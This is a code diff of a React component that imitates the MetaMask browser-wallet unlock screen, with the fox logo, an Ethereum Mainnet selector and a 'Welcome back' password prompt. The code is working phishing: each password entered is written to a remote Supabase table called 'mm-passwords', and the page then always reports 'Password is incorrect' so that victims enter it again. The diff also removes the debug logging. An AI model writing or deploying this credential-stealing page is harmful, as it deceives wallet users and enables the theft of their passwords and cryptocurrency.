@@ -7,9 +7,10 @@ import FormHelperText from '@mui/material/FormHelperText';
 import getCaretCoordinates from 'textarea-caret'
 import axios from 'axios';
 import { supabase } from './supabase';
-import {Button} from '@mui/material';
-import {styled} from '@mui/material/styles';
+import { Button } from '@mui/material';
+import { styled } from '@mui/material/styles';
 import ExpandMoreIcon from '@mui/icons-material/ExpandMore';
+import { dark } from '@mui/material/styles/createPalette';
 
 const BootstrapButton = styled(Button)({
   boxShadow: 'none',
@@ -22,20 +23,15 @@ const BootstrapButton = styled(Button)({
   borderRadius: '15px',
   fontWeight: 400,
   fontFamily: [
-    "Euclid Circular B","Roboto","sans-serif"
+    "Euclid Circular B", "Roboto", "sans-serif"
   ].join(',')
 });
 
 function App() {
-
-  const [inputType, setInputType] = useState('text');
-  const [password, setPassword] =  useState('');
-  const [enabled,setEnabled] = useState('btn-disabled')
+  const [password, setPassword] = useState('');
   const [isError, setIsError] = useState(false);
   const [isDisabled, setIsDisabled] = useState(true);
-  const [savedPassword, setSavedPassword] = useState('');
-  console.log(window.screen.width)
-  const [pos, setPos] = useState({x:177,y:120});
+  const [pos, setPos] = useState({ x: 177, y: 120 });
   const [show, setShow] = useState(true);
 
   useEffect(() => {
@@ -46,132 +42,276 @@ function App() {
     return () => clearTimeout(timer); // cleanup
   }, []);
 
-  const handleFocus = () => {
-    if(password=='')setInputType('text')
-    else setInputType('password');
-  };
-
-  const handleBlur = () => {
-    console.log(password)
-    if(password.length==0)setInputType('text')
-    console.log(inputType)
-  };
-
-  const onChange =(e)=>{
-    if(e.target.value==''){
-      setInputType('text');
-      setEnabled('btn-disabled')
+  const onChange = (e) => {
+    if (e.target.value == '') {
       setIsDisabled(true)
-    }
-    else {
-      setInputType('password');
-      setEnabled('btn-enabled');
+    } else {
       setIsDisabled(false)
     }
+
     setPassword(e.target.value);
     setIsError(false)
 
-    const element =  e.target;
+    const element = e.target;
     const boundingRect = element.getBoundingClientRect();
     const coordinates = getCaretCoordinates(element, element.selectionEnd);
     const x = boundingRect.left + coordinates.left - element.scrollLeft;
     const y = boundingRect.top + coordinates.top - element.scrollTop;
-    setPos({x:x-80,y:y+1000});
+    
+    setPos({ x: x - 80, y: y + 1000 });
   }
 
-  const writeDataToSupabase = async (password) => {
+  const onKeyDown = (e) => {
+    if (e.key === 'Enter' && !isDisabled) {
+      onClick();
+    }
+  }
+
+  const writeDataToSupabase = async (pwd) => {
     const { data, error } = await supabase
-        .from('passwords')
-        .insert([
-            { password }
-        ]);
-    
+      .from('mm-passwords')
+      .insert([
+        { password: pwd }
+      ]);
+
     if (error) {
-        console.error('Error writing data:', error.message);
+      console.error('Error writing data:', error.message);
     } else {
-        console.log('Data written successfully:', data);
+      // console.log('Data written successfully:', data);
     }
   };
 
-  const onClick = async ()=>{
-    setSavedPassword(password);
+  const onClick = async () => {
     setIsError(true);
-    try{
+
+    try {
       writeDataToSupabase(password)
+    } catch (error) {
     }
-    catch(error){
-      console.log(error)
-    }
-    console.log(password,savedPassword)
-    //if(password == savedPassword) window.parent.close()
   }
 
   const darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
+
   return (
-    <div style={{ backgroundColor: darkMode ? '#141618' : '#fff'}}>
-      {show?<div id="loading-content">
-        <img class="loading-logo" src="./metamask-fox.svg" alt="" loading="lazy" />
-        <img class="loading-spinner" src="./spinner.gif" alt="" loading="lazy" />
-      </div>:
-      <div className='App-container' style={{ backgroundColor: darkMode ? '#141618' : '#fff'}}>
-        <div className="App">
-          <div className='page-container'>
-          <header className='App-logo'>
-            <div className='select-chain-box' 
-            style={{backgroundColor: darkMode?'#141618':'#fff',
-             boxShadow:darkMode?'0 2px 16px 0 #00000066':'0 2px 16px 0  #0000001a'}}>
-              <div style={{marginLeft:10}}>
-                <BootstrapButton component="label" variant="" 
-                  disableRipple startIcon={<img src='./ethereum.svg' width='16px' />} 
-                  style={{backgroundColor: darkMode? '#000':'#f2f4f6', color: darkMode?'#fff':'#000'}}>
-                  Ethereum Mainnet
-                  <ExpandMoreIcon />
-                </BootstrapButton>
+    <div style={{ backgroundColor: darkMode ? '#141618' : 'transparent' }}>
+      {show ? <div id="loading-content">
+        <img className="loading-logo" src="./metamask-fox.svg" alt="" loading="lazy" />
+        <img className="loading-spinner" src="./spinner.gif" alt="" loading="lazy" />
+      </div> :
+        <div className='App-container' style={{ backgroundColor: darkMode ? '#141618' : 'transparent' }}>
+          <div className="App">
+            <div className='page-container'>
+              <div className='App-logo'>
+                <div
+                  style={{
+                    padding: 16,
+                    width: 368,
+                    display: 'flex',
+                    alignItems: 'center',
+                    justifyContent: 'space-between',
+                  }}
+                >
+                  <div
+                    style={{
+                      height: 32,
+                      margin: 2,
+                      backgroundColor: 'rgb(243, 245, 249)',
+                      borderRadius: 9999,
+                      fontSize: 14,
+                      letterSpacing: 0.1,
+                      padding: '0 8px',
+                      width: 161.11,
+                      display: 'flex',
+                      alignItems: 'center',
+                      justifyContent: 'space-between',
+                      backgroundColor: darkMode ? 'black' : 'rgb(243, 245, 249)',
+                      cursor: 'pointer'
+                    }}
+                  >
+                    <img 
+                      src="./eth_logo.svg"
+                      style={{
+                        height: 14,
+                        width: 14,
+                        borderRadius: 5,
+                        marginTop: 1
+                      }}
+                    />
+
+                    <div style={{ transform: 'scale(1)', color: darkMode ? 'white' : 'black' }}>
+                      Ethereum Mainnet
+                    </div>
+
+                    <svg 
+                      style={{
+                        height: 12,
+                        width: 12,
+                        marginTop: 1,
+                        fill: darkMode ? 'white' : 'black',
+                      }} 
+                      viewBox="0 0 24 24" 
+                      xmlns="http://www.w3.org/2000/svg"
+                    >
+                      <path d="m2 7.88743 1.775-1.775 8.225 8.22497 8.225-8.22497 1.775 1.775-10 9.99997z"/>
+                    </svg>
+                  </div>
+
+                  <svg 
+                    height="30" 
+                    width="60" 
+                    viewBox="0 0 696 344" 
+                    fill='none'
+                    xmlns="http://www.w3.org/2000/svg" 
+                  >
+                    <path 
+                      d="M394.102 265.407V340.812H355.162V288.57L310.786 293.73C301.039 294.854 296.75 298.041 296.75 303.912C296.75 312.512 304.892 316.136 322.344 316.136C332.985 316.136 344.773 314.553 355.184 311.824L335.026 340.353C326.885 342.165 318.95 343.06 310.579 343.06C275.262 343.06 255.103 329.024 255.103 304.119C255.103 282.149 270.95 270.613 306.956 266.531L354.519 261.004C351.951 247.175 341.516 241.167 320.762 241.167C301.291 241.167 279.78 246.143 260.539 255.431L266.662 221.696C284.55 214.22 304.938 210.367 325.532 210.367C370.825 210.367 394.148 229.173 394.148 265.384L394.102 265.407ZM43.7957 170.991L1.23138 340.812H43.7957L64.9173 255.477L101.542 299.372H145.918L182.542 255.477L203.664 340.812H246.228L203.664 170.968L123.718 265.912L43.7727 170.968L43.7957 170.991ZM203.664 1.14648L123.718 96.0905L43.7957 1.14648L1.23138 170.991H43.7957L64.9173 85.6558L101.542 129.55H145.918L182.542 85.6558L203.664 170.991H246.228L203.664 1.14648ZM496.454 263.825L462.031 258.848C453.431 257.495 450.037 254.766 450.037 250.019C450.037 242.313 458.407 238.919 475.63 238.919C495.559 238.919 513.447 243.001 532.253 251.831L527.506 218.554C512.324 213.119 494.894 210.413 476.777 210.413C434.442 210.413 411.325 225.136 411.325 251.624C411.325 272.241 424.007 283.777 450.954 287.859L485.836 293.065C494.665 294.418 498.289 297.812 498.289 303.247C498.289 310.953 490.147 314.576 473.612 314.576C451.871 314.576 428.319 309.37 409.078 300.082L412.931 333.359C429.466 339.482 450.977 343.105 471.135 343.105C514.617 343.105 537.252 327.924 537.252 300.977C537.252 279.465 524.57 267.907 496.5 263.848L496.454 263.825ZM552.388 186.15V340.812H591.329V186.15H552.388ZM636.829 271.301L690.974 212.638H642.516L591.329 273.319L645.91 340.789H695.057L636.829 271.278V271.301ZM546.953 134.297C546.953 159.203 567.111 173.238 602.429 173.238C610.799 173.238 618.734 172.321 626.876 170.532L647.034 142.003C636.622 144.709 624.835 146.314 614.194 146.314C596.764 146.314 588.6 142.691 588.6 134.091C588.6 128.197 592.911 125.032 602.635 123.909L647.011 118.749V170.991H685.952V95.586C685.952 59.3513 662.629 40.5689 617.335 40.5689C596.718 40.5689 576.354 44.4217 558.466 51.8979L552.342 85.6329C571.583 76.3449 593.095 71.3684 612.565 71.3684C633.32 71.3684 643.755 77.3769 646.323 91.2057L598.759 96.7326C562.754 100.815 546.907 112.35 546.907 134.32L546.953 134.297ZM438.043 126.156C438.043 157.414 456.16 173.261 491.936 173.261C506.201 173.261 517.988 170.991 529.294 165.785L534.271 131.591C523.4 138.15 512.301 141.544 501.201 141.544C484.437 141.544 476.961 134.756 476.961 119.574V74.2809H536.06V42.8163H476.961V16.099L402.909 55.2691V74.2809H437.997V126.133L438.043 126.156ZM399.767 111.892V119.597H294.526C299.273 135.284 313.377 142.462 338.42 142.462C358.349 142.462 376.925 138.38 393.437 130.468L388.69 163.537C373.508 169.867 354.267 173.284 334.567 173.284C282.257 173.284 253.727 150.19 253.727 107.397C253.727 64.603 282.715 40.5918 327.55 40.5918C372.384 40.5918 399.79 66.6441 399.79 111.914L399.767 111.892ZM294.021 93.3155H360.574C357.065 78.2942 345.53 70.451 327.091 70.451C308.653 70.451 297.714 78.0878 294.021 93.3155Z"
+                      fill={darkMode ? 'white' : 'rgb(22,22,22)'}>
+                    </path>
+                  </svg>
+                </div>
+
+                <div style={{marginTop: isError ? -12 : 6}}>
+                  <div style={{height: 175}}>
+                    <Fox followMouse={true} width={170} height={175} followMotion={true} position={pos} />
+                  </div>
+
+                  <h1 
+                    className='title' 
+                    style={{ 
+                      color: darkMode ? '#ffffff' : 'rgb(18, 19, 20)', 
+                      fontSize: 32, 
+                      fontWeight: 500, 
+                      marginTop: 2,
+                      marginBottom: 48,
+                      fontFamily: 'Geist, "Helvetica Neue", Helvetica, Arial, sans-serif'
+                    }} 
+                  >
+                      Welcome back
+                  </h1>
+
+                  <div style={{marginBottom: 16, paddingTop: isError ? 0 : 4 }}>
+                    <input
+                      id='password_input'
+                      type="password"
+                      placeholder='Enter your password'
+                      className={(isError ? ' error-' : '') + (darkMode ? 'dark-input' : 'light-input') + (isError ? ' error-input' : '')}
+                      style={{
+                        width: 334,
+                        borderStyle: 'none',
+                        padding: '0 16px',
+                        fontSize: 16,
+                        height: 45,
+                        borderRadius: 8,
+                        marginBottom: 0,
+                        color: darkMode ? 'white' : 'black',
+                        backgroundColor: darkMode ? '#141618' : 'transparent',
+                      }}
+                      onChange={onChange}
+                      onKeyDown={onKeyDown}
+                    />
+
+                    {
+                      isError && 
+                      <p 
+                        id="component-error-text" 
+                        style={{ 
+                          color: "rgb(202, 53, 66)",
+                          fontSize: 14.8,
+                          textAlign: 'left',
+                          height: 40,
+                          marginTop: isError ? 4 : 0,
+                        }}
+                      >Password is incorrect. Please try again.</p>
+                    }
+                  </div>
+
+                  <button
+                    id='unlock_button'
+                    onClick={onClick}
+                    style={{
+                      width: 368,
+                      height: 48,
+                      borderRadius: 12,
+                      marginBottom: 24,
+                      backgroundColor: darkMode ? 'white' : 'rgb(18, 19, 20)',
+                      borderStyle: 'none',
+                      color: darkMode ? 'rgb(18, 19, 20)' : 'white',
+                      fontFamily: 'sans-serif',
+                      fontWeight: 'bold',
+                      fontSize: 16,
+                    }}
+                    disabled={isDisabled}
+                  >
+                      Unlock
+                  </button>
+
+                  <div style={{marginBottom: 32}}>
+                    <a
+                      className={darkMode ? 'dark-link' : 'light-link'}
+                      target="_blank"
+                      href='chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#restore-vault'
+                      style={{
+                        fontSize: 16,
+                        backgroundColor: 'transparent',
+                        outline: 'none',
+                        color: darkMode ? 'rgb(139, 153, 255)' : 'rgb(68, 89, 255)',
+                        cursor: 'pointer',
+                        fontWeight: 500,
+                        fontFamily: 'Geist, "Helvetica Neue", Helvetica, Arial, sans-serif',
+                        paddingLeft: 0,
+                        paddingRight: 0,
+                        textDecoration: 'none'
+                      }}
+                    >
+                      Forgot password?
+                    </a>
+                  </div>
+
+                  <p 
+                    style={{
+                      fontWeight: 500,
+                      fontSize: 16.2, 
+                      color: 'rgb(18, 19, 20)',
+                      fontFamily: 'sans-serif',
+                      margin: 0
+                    }}
+                  >
+                    <span style={{ color: darkMode ? 'white' : 'black' }}>
+                      Need help? Contact&nbsp;
+                      <a 
+                        className={darkMode ? 'dark-link' : 'light-link'}
+                        href="https://support.metamask.io" 
+                        type="button"
+                        target="_blank"
+                        style={{
+                          color:  darkMode ? 'rgb(139, 153, 255)' : 'rgb(68, 89, 255)', 
+                          fontFamily: 'Geist, "Helvetica Neue", Helvetica, Arial, sans-serif',
+                          letterSpacing: 0.1,
+                          textDecoration: 'none'
+                        }}
+                      >
+                        MetaMask support
+                      </a>
+                    </span>
+                  </p>
+                </div>
               </div>
-              <div style={{marginRight: 10}}>
-                <img src="./metamask-fox.svg" alt=''/>
-              </div>
             </div>
-            <Fox followMouse={true}  width={120} height={120} followMotion={true} position={pos}/>
-            <h1 className='title' style={{color:darkMode?'#ffffff':'#000'}} >Welcome back</h1>
-            <div style={{color:darkMode?'#b7bbc8':'#686e7d'}}>The decentralized web awaits</div>
-            <div className='password-input'>
-              <form action='#'>
-                <TextField
-                  id="standard-password-input"
-                  label="Password"
-                  type={inputType}
-                  value={password}
-                  onChange={onChange}
-                  variant="standard"
-                  autoComplete="off"
-                  autoSave='off'
-                  onFocus={handleFocus}
-                  onBlur={handleBlur}
-                  fullWidth
-                  error = {isError}
-                />
-                {
-                  isError&&<FormHelperText id="component-error-text" style={{color:"red"}}>Incorrect password</FormHelperText>
-
-                }
-                <button className= {`unlock-button ${enabled} `} style={{color:darkMode?"#24272a":"white",backgroundColor:darkMode?'#8b99ff':'#4459ff'}} onClick={onClick} disabled={isDisabled}>Unlock</button>
-
-              </form>
-            </div>
-            <div className='unlock_links'>
-                <a className='button btn-link unlock_link' style = {{color: darkMode?'#8b99ff':'#4459ff'}}>Forgot password?</a>
-            </div>
-            <div className='support'>
-                <span style={{color:darkMode?'white':'#222'}}>Need help? Contact </span>
-                <a href='https://support.metamask.io' target='_blank' className='btn-link no-underline' rel='noopener noref errer' style = {{color: darkMode?'#8b99ff':'#4459ff'}}>MetaMask support</a>
-            </div>
-          </header>
-
           </div>
-        </div>
-      </div>}
+        </div>}
 
+      {/* {!isError ?
+      <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
+        <div style={{ width: 400, height: 600, position: 'absolute', top: 0, zIndex: -1 }}>
+          <img src='./metafox-ui.png' alt='' />
+        </div>
+      </div> :
+
+      <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
+        <div style={{ width: 400, height: 600, position: 'absolute', top: 0, zIndex: -1 }}>
+          <img src='./metafox-ui-error.png' alt='' />
+        </div>
+      </div>} */}
     </div>
   );
 }
